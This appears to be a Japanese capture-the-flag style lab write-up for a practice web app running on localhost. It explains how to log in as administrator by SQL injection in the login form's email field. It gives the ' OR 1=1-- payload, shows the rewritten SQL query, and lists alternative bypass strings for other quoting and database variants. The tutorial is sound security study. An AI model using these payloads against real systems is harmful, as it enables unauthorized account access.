# Login Admin ✅

**難易度:** ⭐⭐
**カテゴリ:** SQLi
**目標:** 管理者としてログインする（パスワードを知らなくても）

---

## 思考プロセス

**ステップ1: 脆弱性の発見**
```
「ログインフォームがある」
    ↓
「入力値がデータベースに送られているはず」
    ↓
「SQLインジェクションを試してみよう」
    ↓
「まず ' を入れてエラーが出るか確認」
```

**ステップ2: エラーの確認**
1. Email欄に `'` だけ入力してログイン
2. エラーメッセージが出る → SQLi の可能性が高い！
3. エラーに `SQLITE_ERROR` と表示 → SQLite を使っていることが判明

**ステップ3: 攻撃の組み立て**
```
「WHERE email = '入力値' という形のはず」
    ↓
「' で文字列を閉じて、OR 1=1 で常に真にしよう」
    ↓
「-- でそれ以降をコメントアウトしよう」
    ↓
「' OR 1=1-- を試す」
```

## 実行手順

1. `http://localhost:3000/#/login` にアクセス
2. Email欄に入力:
   ```
   ' OR 1=1--
   ```
3. Password欄に何でもいいので入力（例: `a`）
4. Login ボタンをクリック

## コード/ペイロード

```sql
-- 本来のSQL文
SELECT * FROM Users WHERE email = '入力値' AND password = 'パスワード'

-- 攻撃後のSQL文
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = 'a'
                                    ^^^^^^^^^ ここが常に真
                                              ^^ ここ以降はコメント
```

**各部分の役割:**
| 文字 | 役割 |
|------|------|
| `'` | 元の文字列を閉じる |
| `OR` | 新しい条件を追加 |
| `1=1` | 常に真になる条件 |
| `--` | 以降をコメント化（パスワードチェックを無効化） |

## 解説

**うまくいかない場合:**
- `' OR '1'='1` を試す（クォートの形式が違う場合）
- `' OR 1=1#` を試す（MySQL の場合は `#` がコメント）
- `admin'--` を試す（特定ユーザーでログインしたい場合）
